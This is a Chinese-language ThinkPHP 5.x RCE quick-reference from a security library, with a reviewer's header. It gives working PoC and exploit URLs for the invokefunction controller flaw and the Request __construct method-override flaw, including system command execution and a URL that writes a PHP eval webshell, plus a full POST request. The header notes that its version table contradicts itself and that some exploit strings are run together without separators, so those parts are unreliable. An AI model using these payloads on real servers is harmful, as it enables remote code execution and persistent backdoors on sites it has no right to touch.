---
version: ""
source: "白阁文库 BaizeSec/bylibrary"
product: "ThinkPHP / 控制器路由与 Request 方法覆盖"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "具体请求包如下，留意下`Content-Type: application/x-www-form-urlencoded`"
title: "01-Thinkphp漏洞速查"
prerequisites: "来源所述条件，未列明部分仍待核：第一类 5.0<5.0.23、5.1<5.1.31；第二类逐版 5.0.8–5.0.23 且 debug 条件，表格与下方矛盾"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-a592e0f0ee27299a8b47119e"
entity_id: "ve-a592e0f0ee27299a8b47119e"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：第一类 5.0&lt;5.0.23、5.1&lt;5.1.31；第二类逐版 5.0.8–5.0.23 且 debug 条件，表格与下方矛盾

代码与实验材料：完整方法覆盖请求，但多版本载荷粘连；写 webshell 属持久副作用

来源证据范围：白阁来源，缺原始披露/补丁链接

- **事实待核（1）**：version 元数据不是版本；依据：抽成“具体请求包如下，留意 Content-Type...”。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（2）**：5.0.20 是否受影响自相矛盾；依据：表格 5.0.20 否，下文 payload 标 5.0.20–5.0.23；“5.0全系列”也与表格前八版否矛盾。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（3）**：多条载荷丢分隔；依据：版本号、参数与或字连成一行，不可当原样请求。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（4）**：未分两种根因的独立实体；依据：控制器 invokefunction 和 Request __construct 应各标版本、前提、来源，不能统称一个 RCE。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 目录

##### 一、控制器名引起的RCE

##### 二、核心类Requests引起的RCE

### 一、控制器名引起的RCE

##### 公开时间：  

2018/12/09  

##### 影响版本：  

ThinkPHP 5.0系列 < 5.0.23
ThinkPHP 5.1系列 < 5.1.31

poc:  

```
http://127.0.0.1/tp5022/public/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1
```

exp:  

```
http://127.0.0.1/tp5022/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

shell:  

```
http://127.0.0.1/tp5022/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=a.php&vars[1][]=<?php eval(@$_POST['a']);?>#shell地址http://127.0.0.1/tp5022/public/a.php
```

### 二、核心类Requests引起的RCE  

##### 公开时间：  

2019/01/11

##### 影响版本：  

5.0全系列，具体如下  

```
版本名  是否可被攻击  攻击条件
5.0.0   否           无
5.0.1   否           无
5.0.2   否           无
5.0.3   否           无
5.0.4   否           无
5.0.5   否           无
5.0.6   否           无
5.0.7   否           无
5.0.8   是           无需开启debug
5.0.9   是           无需开启debug
5.0.10  是           无需开启debug
5.0.11  是           无需开启debug
5.0.12  是           无需开启debug
5.0.13  是           需开启debug
5.0.14  是           需开启debug
5.0.15  是           需开启debug
5.0.16  是           需开启debug
5.0.17  是           需开启debug
5.0.18  是           需开启debug
5.0.19  是           需开启debug
5.0.20  否           无
5.0.21  是           需开启debug
5.0.22  是           需开启debug
5.0.23  是           需开启debug
5.0.24  否           无
```

exp：  

```
版本号：5.0.8~5.0.19s=whoami&_method=__construct&filter&filter=system版本号：5.0.20~5.0.23_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami或_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
```

具体请求包如下，留意下`Content-Type: application/x-www-form-urlencoded`  

```
POST /tp5022/public/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
```


---

> 来源：白阁文库 BaizeSec/bylibrary
